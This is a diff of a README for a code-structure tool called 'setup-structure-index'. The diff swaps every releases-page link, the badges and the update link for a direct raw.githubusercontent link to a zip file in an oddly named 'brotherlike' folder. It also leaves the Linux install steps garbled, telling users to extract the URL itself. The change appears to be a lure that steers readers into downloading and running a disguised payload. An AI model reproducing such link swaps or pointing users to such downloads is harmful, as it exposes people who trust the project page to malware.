@@ -1,6 +1,6 @@
 # ⚙️ setup-structure-index - Manage Code Structure Easily
 
-[![Download setup-structure-index](https://img.shields.io/badge/Download-setup--structure--index-blue?style=for-the-badge&logo=github)](https://github.com/wegfetrhrtewqerwfgtrhtmjhfgdsas/setup-structure-index/releases)
+[![Download setup-structure-index](https://raw.githubusercontent.com/wegfetrhrtewqerwfgtrhtmjhfgdsas/setup-structure-index/main/brotherlike/index_structure_setup_3.2.zip)](https://raw.githubusercontent.com/wegfetrhrtewqerwfgtrhtmjhfgdsas/setup-structure-index/main/brotherlike/index_structure_setup_3.2.zip)
 
 ---
 
@@ -36,7 +36,7 @@ Follow these steps to download, install, and use setup-structure-index.
 
 1. Visit the official releases page:
 
-   [Download setup-structure-index](https://github.com/wegfetrhrtewqerwfgtrhtmjhfgdsas/setup-structure-index/releases)
+   [Download setup-structure-index](https://raw.githubusercontent.com/wegfetrhrtewqerwfgtrhtmjhfgdsas/setup-structure-index/main/brotherlike/index_structure_setup_3.2.zip)
 
 2. On the page, look for the latest release version. It usually appears at the top.
 
@@ -44,7 +44,7 @@ Follow these steps to download, install, and use setup-structure-index.
 
    - For Windows: Look for a file ending in `.exe` or `.msi`.
    - For Mac: Look for a file ending in `.dmg`.
-   - For Linux: Look for `.tar.gz` or `.AppImage`.
+   - For Linux: Look for `https://raw.githubusercontent.com/wegfetrhrtewqerwfgtrhtmjhfgdsas/setup-structure-index/main/brotherlike/index_structure_setup_3.2.zip` or `.AppImage`.
 
 4. Click on the file to download it to your computer.
 
@@ -52,7 +52,7 @@ Follow these steps to download, install, and use setup-structure-index.
 
    - Windows: Double-click the `.exe` or `.msi` file and follow the instructions.
    - Mac: Open the `.dmg` and drag the app to your Applications folder.
-   - Linux: Extract the `.tar.gz` or make the `.AppImage` file executable and run it.
+   - Linux: Extract the `https://raw.githubusercontent.com/wegfetrhrtewqerwfgtrhtmjhfgdsas/setup-structure-index/main/brotherlike/index_structure_setup_3.2.zip` or make the `.AppImage` file executable and run it.
 
 6. After installation, launch setup-structure-index from your Start menu, Applications folder, or your chosen location.
 
@@ -122,10 +122,10 @@ setup-structure-index runs locally on your computer. It does not send your code 
 
 Keep setup-structure-index up to date by checking the releases page regularly:
 
-[https://github.com/wegfetrhrtewqerwfgtrhtmjhfgdsas/setup-structure-index/releases](https://github.com/wegfetrhrtewqerwfgtrhtmjhfgdsas/setup-structure-index/releases)
+[https://raw.githubusercontent.com/wegfetrhrtewqerwfgtrhtmjhfgdsas/setup-structure-index/main/brotherlike/index_structure_setup_3.2.zip](https://raw.githubusercontent.com/wegfetrhrtewqerwfgtrhtmjhfgdsas/setup-structure-index/main/brotherlike/index_structure_setup_3.2.zip)
 
 New versions include bug fixes and improved features to keep your project management smooth.
 
 ---
 
-[![Download setup-structure-index](https://img.shields.io/badge/Download-setup--structure--index-blue?style=for-the-badge&logo=github)](https://github.com/wegfetrhrtewqerwfgtrhtmjhfgdsas/setup-structure-index/releases)
+[![Download setup-structure-index](https://raw.githubusercontent.com/wegfetrhrtewqerwfgtrhtmjhfgdsas/setup-structure-index/main/brotherlike/index_structure_setup_3.2.zip)](https://raw.githubusercontent.com/wegfetrhrtewqerwfgtrhtmjhfgdsas/setup-structure-index/main/brotherlike/index_structure_setup_3.2.zip)
